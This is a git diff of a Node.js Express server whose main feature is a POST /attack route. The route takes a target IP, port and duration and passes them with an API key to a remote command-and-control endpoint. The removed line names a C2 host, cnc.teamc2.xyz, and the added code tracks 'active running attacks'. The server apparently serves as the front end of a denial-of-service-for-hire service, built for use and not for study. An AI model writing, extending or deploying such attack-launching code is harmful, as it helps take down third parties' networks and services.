@@ -9,18 +9,36 @@ const cors = require("cors");
 const app = express();
 
 // ================= MIDDLEWARE =================
+
 app.use(cors());
 app.use(express.json());
 app.use(express.urlencoded({ extended: true }));
 
 // ================= ENV =================
+
 const API_KEY = process.env.API_KEY;
 const PORT = process.env.PORT || 8080;
 
 console.log("API_KEY:", API_KEY ? "Loaded ✅" : "Missing ❌");
 console.log("PORT:", PORT);
 
+// ================= GLOBAL VARIABLES =================
+
+// active running attacks
+let activeRequests = 0;
+
+// total API hits
+let totalRequests = 0;
+
+// ================= REQUEST COUNTER =================
+
+app.use((req, res, next) => {
+  totalRequests++;
+  next();
+});
+
 // ================= GLOBAL ERROR HANDLERS =================
+
 process.on("uncaughtException", (err) => {
   console.error("UNCAUGHT ERROR:", err);
 });
@@ -29,17 +47,22 @@ process.on("unhandledRejection", (err) => {
   console.error("UNHANDLED PROMISE:", err);
 });
 
-// ================= HEALTH ROUTES =================
+// ================= HOME ROUTE =================
+
 app.get("/", (req, res) => {
   return res.status(200).send("🚀 API Running");
 });
 
+// ================= HEALTH ROUTE =================
+
 app.get("/health", (req, res) => {
   return res.status(200).json({
-    status: true,
+    success: true,
     msg: "Server healthy"
   });
 });
+
+// ================= TEST ROUTE =================
 
 app.get("/test", (req, res) => {
   return res.json({
@@ -48,21 +71,11 @@ app.get("/test", (req, res) => {
   });
 });
 
-// ================= GLOBAL STATS =================
-
-let totalRequests = 0;
-
-// request counter middleware
-app.use((req, res, next) => {
-  totalRequests++;
-  next();
-});
-
 // ================= STATUS ROUTE =================
 
 app.get("/status", (req, res) => {
 
-  const uptimeSeconds = process.uptime();
+  console.log("STATUS CHECKED");
 
   return res.json({
 
@@ -70,17 +83,16 @@ app.get("/status", (req, res) => {
 
     server: "ONLINE ✅",
 
-    uptime: `${Math.floor(uptimeSeconds)} sec`,
+    activeRequests,
 
     totalRequests,
 
-    memory: process.memoryUsage(),
+    uptimeSeconds: Math.floor(process.uptime()),
 
-    services: {
-      api: true,
-      attackRoute: true,
-      healthRoute: true,
-      testRoute: true
+    memoryUsage: {
+      rss: process.memoryUsage().rss,
+      heapUsed: process.memoryUsage().heapUsed,
+      heapTotal: process.memoryUsage().heapTotal
     },
 
     timestamp: new Date().toISOString()
@@ -89,9 +101,10 @@ app.get("/status", (req, res) => {
 
 });
 
-
 // ================= ATTACK API =================
+
 app.post("/attack", async (req, res) => {
+
   try {
 
     let { ip, port, time } = req.body;
@@ -122,10 +135,36 @@ app.post("/attack", async (req, res) => {
       });
     }
 
+    // ================= ACTIVE REQUEST ++ =================
+
+    activeRequests++;
+
+    console.log(
+      "ATTACK STARTED | ACTIVE REQUESTS:",
+      activeRequests
+    );
+
+    // ================= AUTO REMOVE AFTER TIME =================
+
+    setTimeout(() => {
+
+      activeRequests--;
+
+      if (activeRequests < 0) {
+        activeRequests = 0;
+      }
+
+      console.log(
+        "ATTACK FINISHED | ACTIVE REQUESTS:",
+        activeRequests
+      );
+
+    }, time * 1000);
+
     // ================= TARGET API =================
 
     const url =
-      `http://cnc.teamc2.xyz:5001/api/attack` +
+      `http://url.com` +
       `?api_key=${API_KEY}` +
       `&target=${ip}` +
       `&port=${port}` +
@@ -134,7 +173,7 @@ app.post("/attack", async (req, res) => {
 
     console.log("REQUEST URL:", url);
 
-    // ================= REQUEST =================
+    // ================= API REQUEST =================
 
     const response = await axios.get(url, {
       timeout: 15000
@@ -143,8 +182,13 @@ app.post("/attack", async (req, res) => {
     // ================= RESPONSE =================
 
     return res.json({
+
       success: true,
+
+      activeRequests,
+
       result: response.data
+
     });
 
   } catch (err) {
@@ -156,12 +200,18 @@ app.post("/attack", async (req, res) => {
 
     return res.status(500).json({
       success: false,
-      error: err?.response?.data || err.message || "Server error"
+      error:
+        err?.response?.data ||
+        err.message ||
+        "Server error"
     });
+
   }
+
 });
 
 // ================= 404 HANDLER =================
+
 app.use((req, res) => {
   return res.status(404).json({
     success: false,
@@ -170,16 +220,23 @@ app.use((req, res) => {
 });
 
 // ================= START SERVER =================
+
 const server = app.listen(PORT, "0.0.0.0", () => {
   console.log(`🚀 Server running on port ${PORT}`);
 });
 
 // ================= GRACEFUL SHUTDOWN =================
+
 process.on("SIGTERM", () => {
+
   console.log("SIGTERM received. Shutting down...");
 
   server.close(() => {
+
     console.log("Server closed");
+
     process.exit(0);
+
   });
+
 });
